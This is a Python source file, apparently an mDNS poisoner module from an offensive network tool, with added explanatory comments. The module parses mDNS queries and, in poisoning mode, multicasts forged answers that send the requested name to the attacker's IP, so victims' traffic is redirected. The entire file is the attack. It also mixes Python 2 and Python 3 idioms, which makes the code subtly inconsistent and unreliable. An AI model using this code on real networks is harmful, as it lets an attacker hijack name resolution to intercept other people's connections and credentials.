import struct  
from SocketServer import BaseRequestHandler  
from packets import MDNS_Ans  
from utils import *  

# Function to parse the mDNS name from the request
def Parse_MDNS_Name(data):
    try:
        data = data[12:]  
        NameLen = struct.unpack('>B', data[0])[0]  
        Name = data[1:1+NameLen]  
        NameLen_ = struct.unpack('>B', data[1+NameLen])[0]  
        Name_ = data[1+NameLen:1+NameLen+NameLen_+1]  
        # Returning the concatenated name in the format 'first_part.second_part'
        return Name + '.' + Name_
    except IndexError:
        # Return None if there is an error in the parsing process (e.g., malformed packet)
        return None

# Function to extract the poisoned mDNS name (removing the last 5 bytes)
def Poisoned_MDNS_Name(data):
    data = data[12:]  
    return data[:len(data)-5]  

# The main class to handle incoming mDNS requests
class MDNS(BaseRequestHandler):
    def handle(self):
        # Defining the Multicast address and port used by mDNS
        MADDR = "224.0.0.251"  # Multicast IP for mDNS
        MPORT = 5353  # mDNS port

        data, soc = self.request  # Get the incoming data and the socket
        Request_Name = Parse_MDNS_Name(data)  # Parse the mDNS name from the request

        # List to store the mDNS poisoning or analysis results
        mdns_results = []

        # Check if the request name is valid and if the server should respond to this host
        if not Request_Name or not RespondToThisHost(self.client_address[0], Request_Name):
            return None  # Exit if the name is invalid or we don't want to respond

        if settings.Config.AnalyzeMode:  # If the server is in analyze mode
            if Parse_IPV6_Addr(data):  # Check if the request is IPv6
                # Add analysis result to the list (ignoring the request in analyze mode)
                mdns_results.append(f'[Analyze mode: MDNS] Request by {self.client_address[0]} for {Request_Name}, ignoring')
        else:  # If the server is in poisoning mode
            if Parse_IPV6_Addr(data):  # Check if the request is IPv6
                # Get the poisoned mDNS name by manipulating the data
                Poisoned_Name = Poisoned_MDNS_Name(data)
                # Create a forged mDNS answer packet with the poisoned name and IP address
                Buffer = MDNS_Ans(AnswerName=Poisoned_Name, IP=socket.inet_aton(settings.Config.Bind_To))
                Buffer.calculate()  # Calculate the final size and structure of the packet
                # Send the poisoned answer to the multicast address and port
                soc.sendto(str(Buffer), (MADDR, MPORT))

                # Add the poisoning result to the list
                mdns_results.append(f'[*] [MDNS] Poisoned answer sent to {self.client_address[0]} for name {Request_Name}')

        return mdns_results  